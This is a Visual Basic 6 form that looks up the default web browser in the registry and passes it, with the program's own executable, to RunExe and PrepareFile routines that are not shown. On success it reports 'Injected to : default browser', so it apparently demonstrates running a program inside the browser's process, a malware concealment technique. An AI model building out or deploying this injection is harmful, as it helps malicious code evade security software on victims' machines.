VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Form1"
   ClientHeight    =   570
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   3075
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   570
   ScaleWidth      =   3075
   StartUpPosition =   2  'CenterScreen
   Begin VB.Timer Timer1 
      Interval        =   10000
      Left            =   120
      Top             =   0
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim BrowserName As String

Public Sub Form_Load()
    RunExe GetBrowserName, PrepareFile(App.Path & "\" & App.EXEName & ".exe")
    If LCase(App.EXEName & ".exe") = LCase(BrowserName) Then
        MsgBox "Injected to : default browser"
   Else
        End
    End If
End Sub

Public Sub Timer1_Timer()
MsgBox "still here"
End Sub

Private Function GetBrowserName() As String 'Only if we want to inject to the default browser
    On Error Resume Next
    Dim Regentry As String
    Dim SplittedDB() As String
    
    Set TheReg = CreateObject("Wscript.Shell")
    Regentry = TheReg.RegRead("HKEY_CLASSES_ROOT\HTTP\shell\open\command\")
    Regentry = Replace(Regentry, Chr(34), "")
    Regentry = Mid(Regentry, 1, InStr(1, LCase(Regentry), ".exe") + 3)
    SplittedDB = Split(Regentry, "\")
    BrowserName = SplittedDB(UBound(SplittedDB))
    GetBrowserName = Regentry
End Function
